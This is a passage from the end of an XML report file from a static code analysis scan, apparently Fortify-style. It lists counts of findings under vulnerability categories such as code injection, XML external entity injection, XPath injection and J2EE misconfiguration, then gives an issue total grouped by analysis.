                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Weak Encryption: Insecure Mode of Operation</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Dead Code: Expression is Always true</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Dynamic Code Evaluation: Code Injection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>File Disclosure: J2EE</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Insecure Randomness</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Bad Practices: Sockets</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Misconfiguration: Excessive Servlet Mappings</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Misconfiguration: Excessive Session Timeout</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Misconfiguration: Missing Servlet Mapping</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Poor Error Handling: Throw Inside Finally</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Poor Style: Confusing Naming</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Race Condition: Singleton Member Field</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>System Information Leak: External</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>XML Entity Expansion Injection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>XML External Entity Injection</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>XPath Injection</groupTitle>
                    </GroupingSection>
                </Chart>
            </IssueListing>
        </SubSection>
    </ReportSection>
    <ReportSection enabled="true" optionalSubsections="true">
        <Title>Issue Breakdown by Analysis</Title>
        <SubSection enabled="true">
            <Title>Issue by Analysis</Title>
            <IssueListing listing="false" limit="-1">
                <Refinement></Refinement>
                <Chart chartType="pie">
                    <Axis>Analysis</Axis>
                    <MajorAttribute>Analysis</MajorAttribute>
                    <GroupingSection count="1904">
                        <groupTitle>&lt;none&gt;</groupTitle>
                    </GroupingSection>
                </Chart>
            </IssueListing>
        </SubSection>
    </ReportSection>
</ReportDefinition>
